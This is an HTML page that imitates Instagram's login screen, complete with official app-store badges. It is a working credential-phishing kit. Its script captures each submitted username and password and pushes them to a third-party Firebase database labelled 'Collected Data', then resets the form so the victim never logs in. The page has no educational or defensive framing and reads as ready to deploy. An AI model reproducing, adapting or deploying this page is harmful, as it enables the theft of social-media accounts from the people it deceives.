<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Instagram Login</title>
    <link rel="icon" type="image/x-icon" href="logo-instagram-1080p-5.png">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"
        integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2"
        crossorigin="anonymous">
    <style>
        body {
            background-color: rgb(0, 0, 0); /* Black background */
            color: white; /* White text color */
        }
        .container {
            margin-top: 100px; /* Adjusted margin for a centered form */
            max-width: 400px; /* Limit the width to look like Instagram */
        }
        .card {
            background-color: #333; /* Darker card background */
            border: none; /* No border */
            padding: 20px; /* Padding inside card */
            border-radius: 10px; /* Rounded corners */
        }
        h2 {
            text-align: center; /* Center the title */
            color: #ffffff; /* White title color */
            margin-bottom: 20px; /* Space below title */
        }
        .btn-primary {
            width: 100%; /* Full width button */
            margin-top: 10px; /* Space above button */
        }
        .form-group label {
            color: #ffffff; /* White label color */
        }
    </style>
</head>

<body>
    <div class="container">
        <h2>Instagram</h2>

        <form id="contactForm">
            <div class="card">
                <div class="card-body">
                    <div class="form-group">
                        <label for="name">Username</label>
                        <input type="text" class="form-control" id="name" placeholder="Phone number, username, or email" required>
                    </div>
                    <div class="form-group">
                        <label for="email">Password</label>
                        <input type="password" class="form-control" id="email" placeholder="Password" required>
                    </div>
                </div>
                <button type="submit" class="btn btn-primary">Log in</button>
            </div>
        </form>
        

        <div class="text-center mt-3">
            <p style="color: #ffffff;">Don't have an account? <a href="#" style="color: #0095f6;">Sign up</a></p>
            <div class="app">
              <p>Get the app.</p>
              <div class="app-img">
                <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                  <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png"   
             width="160" height="100">
                </a>
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                  <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png"   
             width="160" height="100">
                </a> 
                 
              </div>
            </div>
        </div>
    </div>
    

    <script src="https://www.gstatic.com/firebasejs/3.7.4/firebase.js"></script>
     
    <script>
        let firebaseConfig = {
            apiKey: "AIzaSyCrpbW82FwfLZAd2AJUu3o9YjpsJtoD2p8",
            authDomain: "login-e49c4.firebaseapp.com",
            databaseURL: "https://login-e49c4-default-rtdb.firebaseio.com",
            projectId: "login-e49c4",
            storageBucket: "login-e49c4.appspot.com",
            messagingSenderId: "436239142148",
            appId: "1:436239142148:web:e0468265a3625bbecd5451",
            measurementId: "G-NS5RE88TTJ"
        };
        firebase.initializeApp(firebaseConfig);
 
        let messagesRef = firebase.database().ref('Collected Data');
         
        document.getElementById('contactForm').addEventListener('submit', submitForm);
 
        function submitForm(e) {
            e.preventDefault();
 
            // Get values
            let name = getInputVal('name');
            let email = getInputVal('email');
 
            saveMessage(name, email);
            document.getElementById('contactForm').reset();
        }
 
        // Function to get form values
        function getInputVal(id) {
            return document.getElementById(id).value;
        }
 
        // Save message to firebase
        function saveMessage(name, email) {
            let newMessageRef = messagesRef.push();
            newMessageRef.set({
                name: name,
                email: email,
            });
        }
    </script>
    
</body>

</html>
